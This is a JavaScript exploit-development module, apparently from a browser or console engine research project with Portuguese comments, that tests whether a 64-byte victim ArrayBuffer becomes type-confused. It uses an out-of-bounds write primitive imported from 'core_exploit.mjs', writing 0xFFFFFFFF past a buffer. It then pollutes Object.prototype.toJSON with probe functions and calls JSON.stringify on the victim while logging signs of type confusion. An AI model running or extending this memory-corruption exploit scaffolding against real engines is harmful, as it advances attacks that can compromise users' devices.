// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---

// V1: Operações básicas em ArrayBuffer (byteLength, DataView R/W)
export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_array_buffer_instance_entry: this instanceof ArrayBuffer,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD,
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };
    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at entry.";
            return result;
        }
        result.byteLength_prop = this.byteLength;
        const dv = new DataView(this);
        result.is_dataview_created = true;

        if (this.byteLength >= 4) {
            dv.setUint32(0, result.dv_write_val, true);
            const readVal = dv.getUint32(0, true);
            result.dv_read_val = toHex(readVal);
            if (readVal === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        } else {
            result.dv_read_val = `Buffer too small for DV R/W (size: ${this.byteLength})`;
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO: ${result.error}`, "error", FNAME_toJSON);
    }
    return result;
}

// V2_Detailed (NOVA): V1 + loop for...in this com logs detalhados para type confusion
export function toJSON_AB_Probe_V2_Detailed() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: "N/A",
        is_array_buffer_instance_entry: false,
        byteLength_prop: "N/A",
        for_in_iterations: 0,
        this_type_in_loop: "N/A", // Tipo de this na primeira iteração do loop ou onde mudar
        this_type_after_loop: "N/A",
        error: null
    };

    logS3(`[${FNAME_toJSON}] Entrando. this type inicial: ${Object.prototype.toString.call(this)}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
    result.this_type_entry = Object.prototype.toString.call(this);
    result.is_array_buffer_instance_entry = this instanceof ArrayBuffer;

    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at ENTRY.";
            logS3(`[${FNAME_toJSON}] ${result.error}`, "critical", FNAME_toJSON);
            return result;
        }

        result.byteLength_prop = this.byteLength;
        logS3(`[${FNAME_toJSON}] Antes do for...in. this type: ${Object.prototype.toString.call(this)}, len: ${this.byteLength}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);

        for (const prop in this) {
            result.for_in_iterations++;
            const current_this_type_in_loop = Object.prototype.toString.call(this);
            const current_instanceof_ab_in_loop = this instanceof ArrayBuffer;
            if (result.for_in_iterations === 1 || result.this_type_in_loop === "N/A") { // Captura o tipo na primeira iteração
                result.this_type_in_loop = current_this_type_in_loop;
            }
            logS3(`[${FNAME_toJSON}] Dentro do for...in, iter ${result.for_in_iterations}, prop: '${prop}'. this type: ${current_this_type_in_loop}, instanceof AB: ${current_instanceof_ab_in_loop}`, "info", FNAME_toJSON);

            if (!current_instanceof_ab_in_loop && result.this_type_entry === "[object ArrayBuffer]") {
                logS3(`[${FNAME_toJSON}] !!!! TYPE CONFUSION DETECTADA DENTRO do loop for...in !!!! this era ArrayBuffer, agora é ${current_this_type_in_loop}`, "critical", FNAME_toJSON);
                result.error = `Type confusion inside for...in (was ArrayBuffer, became ${current_this_type_in_loop})`;
                result.this_type_in_loop = current_this_type_in_loop; // Garante que o tipo confuso seja registrado
                break; // Sai do loop ao detectar a confusão
            }
            if (result.for_in_iterations > 100) { // Safety break reduzido
                logS3(`[${FNAME_toJSON}] Loop for...in excedeu 100 iterações. Interrompendo.`, "warn", FNAME_toJSON);
                if (!result.error) result.error = "Max iterations reached in for...in";
                break;
            }
        }
        result.this_type_after_loop = Object.prototype.toString.call(this);
        logS3(`[${FNAME_toJSON}] Após o for...in. Iterações: ${result.for_in_iterations}. this type final: ${result.this_type_after_loop}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);

    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO GERAL na toJSON: ${result.error}. this type: ${Object.prototype.toString.call(this)}`, "error", FNAME_toJSON);
    }
    return result;
}


// V3: (V2 com logs detalhados) + atribuição props_payload[prop] = String(this[prop]).substring() dentro do for...in
export function toJSON_AB_Probe_V3() {
    const FNAME_toJSON = "toJSON_AB_Probe_V3";
    // Inicia com a lógica de V2_Detailed para ter os logs e a checagem de type confusion
    let result = toJSON_AB_Probe_V2_Detailed();
    result.toJSON_variant = FNAME_toJSON; // Sobrescreve
    result.props_assigned_count = 0;
    result.assignment_error_detail = null; // Renomeado para não colidir com 'error' de V2_Detailed

    if (result.error) { // Se V2_Detailed já teve erro (ex: type confusion), não prossegue com atribuições
        logS3(`[${FNAME_toJSON}] Erro prévio de V2_Detailed ('${result.error}'), pulando lógica de atribuição V3.`, "warn", FNAME_toJSON);
        return result;
    }

    let props_payload = {};
    try {
        // Reinicia a contagem de iterações para este loop específico se quisermos ser granulares
        // mas vamos assumir que o result.for_in_iterations de V2_Detailed é o que queremos para o log
        // Se V2_Detailed saiu por type confusion, o loop aqui não deve rodar muito.
        logS3(`[${FNAME_toJSON}] Entrando na lógica de atribuição V3. this type atual: ${Object.prototype.toString.call(this)}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);

        let v3_iterations = 0; // Contador separado para o loop V3
        for (const prop in this) {
            v3_iterations++;
            // Re-checar type confusion a cada iteração ANTES de tentar operar
            const current_this_type_v3 = Object.prototype.toString.call(this);
            const current_instanceof_ab_v3 = this instanceof ArrayBuffer;
             if (!current_instanceof_ab_v3) {
                logS3(`[${FNAME_toJSON}] !!!! TYPE CONFUSION DETECTADA ANTES DA ATRIBUIÇÃO na iter ${v3_iterations}!!!! this é ${current_this_type_v3}`, "critical", FNAME_toJSON);
                result.assignment_error_detail = `Type confusion before assignment in V3 (became ${current_this_type_v3})`;
                if (!result.error) result.error = result.assignment_error_detail;
                break;
            }

            if (Object.prototype.hasOwnProperty.call(this, prop)) {
                try {
                    if (typeof this[prop] !== 'function') {
                        props_payload[prop] = String(this[prop]).substring(0, 50);
                        result.props_assigned_count++;
                    }
                } catch (e_assign) {
                    result.assignment_error_detail = `Error assigning prop '${prop}': ${e_assign.name} - ${e_assign.message}`;
                    logS3(`[${FNAME_toJSON}] ERRO ao processar/atribuir prop '${prop}': ${result.assignment_error_detail}`, "warn", FNAME_toJSON);
                    // Não quebrar o loop por um erro em uma propriedade, mas registrar
                }
            }
            if (v3_iterations > 100) { // Safety break
                logS3(`[${FNAME_toJSON}] Loop de atribuição V3 excedeu 100 iterações.`, "warn", FNAME_toJSON);
                if (!result.assignment_error_detail && !result.error) result.error = "Max iterations in V3 assignment loop";
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop de atribuição V3 completou ${v3_iterations} iterações. Props atribuídas: ${result.props_assigned_count}`, "info", FNAME_toJSON);

    } catch (e_for_in_v3) {
        result.assignment_error_detail = `Erro no loop de atribuição V3: ${e_for_in_v3.name}: ${e_for_in_v3.message}`;
        if (!result.error) result.error = result.assignment_error_detail;
        logS3(`[${FNAME_toJSON}] ERRO GERAL no loop de atribuição V3: ${result.assignment_error_detail}`, "error", FNAME_toJSON);
    }
    return result;
}


export async function executeVictimABInstabilityTest(toJSONFunctionToUse, toJSONFunctionName) {
    const FNAME_TEST = `executeVictimABInstabilityTest<${toJSONFunctionName}>`;
    logS3(`--- Iniciando Sub-Teste: Sondando victim_ab com ${toJSONFunctionName} ---`, "subtest", FNAME_TEST);
    document.title = `Sondando victim_ab - ${toJSONFunctionName}`;

    const victim_ab_size_val = 64;
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando sub-teste.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed") };
    }

    let victim_ab;
    try {
        victim_ab = new ArrayBuffer(victim_ab_size_val);
        logS3(`1. victim_ab (${victim_ab_size_val} bytes) criado.`, "info", FNAME_TEST);
    } catch (e_victim_alloc) {
        logS3(`ERRO ao criar victim_ab: ${e_victim_alloc.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_victim_alloc };
    }
     // Adicionar propriedades customizadas para testar o for...in (Passo 3 da sugestão anterior)
    try {
        victim_ab.customPropStr = "hello_victim";
        victim_ab.customPropNum = 12345;
        logS3(`   Propriedades customizadas adicionadas a victim_ab.`, "info", FNAME_TEST);
    } catch (e_custom_prop) {
        logS3(`   ERRO ao adicionar props customizadas a victim_ab: ${e_custom_prop.message}`, "warn", FNAME_TEST);
    }


    try {
        logS3(`2. Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando victim_ab com ${toJSONFunctionName}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let result = {
        targetObjectId: "victim_ab",
        stringifyError: null,
        toJSONReturn: null,
    };

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        logS3(`   Chamando JSON.stringify(victim_ab) usando ${toJSONFunctionName}...`, 'info', FNAME_TEST);
        document.title = `Stringify victim_ab - ${toJSONFunctionName}`;
        try {
            result.toJSONReturn = JSON.stringify(victim_ab);
            logS3(`     JSON.stringify(victim_ab) completou. Retorno da toJSON: ${JSON.stringify(result.toJSONReturn)}`, "info", FNAME_TEST);
            // A checagem de erro interno da toJSON agora é feita primariamente pelo log dela
            if (result.toJSONReturn && result.toJSONReturn.error) {
                 logS3(`     ERRO INTERNO (reportado pela toJSON) na ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "warn", FNAME_TEST);
                 // Não sobrescrever stringifyError se já houver um erro de JSON.stringify
                 if (!result.stringifyError) result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.error };
            }
        } catch (e_str) {
            result.stringifyError = { name: e_str.name, message: e_str.message };
            logS3(`     !!!! ERRO AO STRINGIFY victim_ab !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do teste para victim_ab: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Análise mais detalhada do resultado da toJSON
    let final_verdict_is_problem = false;
    if (result.stringifyError) {
        final_verdict_is_problem = true;
        logS3(`   ---> Problema Principal: Erro no JSON.stringify(): ${result.stringifyError.name}`, "critical", FNAME_TEST);
        if (result.stringifyError.name === 'RangeError') document.title = `RangeError with ${toJSONFunctionName}!`;
    } else if (result.toJSONReturn && result.toJSONReturn.error) {
        final_verdict_is_problem = true;
        logS3(`   ---> Problema Principal: Erro interno reportado pela ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "error", FNAME_TEST);
        if (String(result.toJSONReturn.error).toLowerCase().includes("type confusion")) {
            document.title = `TypeConfusion with ${toJSONFunctionName}!`;
        }
    } else if (result.toJSONReturn) {
        // Para V1:
        if (result.toJSONReturn.toJSON_variant === "toJSON_AB_Probe_V1") {
            if (!result.toJSONReturn.is_array_buffer_instance_entry || result.toJSONReturn.byteLength_prop !== victim_ab_size_val || !result.toJSONReturn.dv_rw_match) {
                final_verdict_is_problem = true;
                logS3(`   ---> Problema com ${result.toJSONReturn.toJSON_variant}: Falha nas verificações básicas do ArrayBuffer. isAB=${result.toJSONReturn.is_array_buffer_instance_entry}, len=${result.toJSONReturn.byteLength_prop}, rwMatch=${result.toJSONReturn.dv_rw_match}`, "warn", FNAME_TEST);
            }
        }
        // Para V2_Detailed:
        else if (result.toJSONReturn.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
             if (result.toJSONReturn.is_array_buffer_instance_entry &&
                (result.toJSONReturn.this_type_in_loop !== "[object ArrayBuffer]" && result.toJSONReturn.this_type_in_loop !== "N/A") || // N/A se loop 0 iters
                (result.toJSONReturn.this_type_after_loop !== "[object ArrayBuffer]")) {
                final_verdict_is_problem = true;
                logS3(`   ---> TYPE CONFUSION DETECTADA por ${result.toJSONReturn.toJSON_variant}. Entry: ${result.toJSONReturn.this_type_entry}, InLoop: ${result.toJSONReturn.this_type_in_loop}, AfterLoop: ${result.toJSONReturn.this_type_after_loop}`, "critical", FNAME_TEST);
                document.title = `TypeConfusion with ${toJSONFunctionName}!`;
            }
        }
    }

    if (!final_verdict_is_problem) {
        logS3(`   ${toJSONFunctionName} para victim_ab completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste com ${toJSONFunctionName} (alvo victim_ab) CONCLUÍDO ---`, "subtest", FNAME_TEST);
    clearOOBEnvironment();
    return result;
}
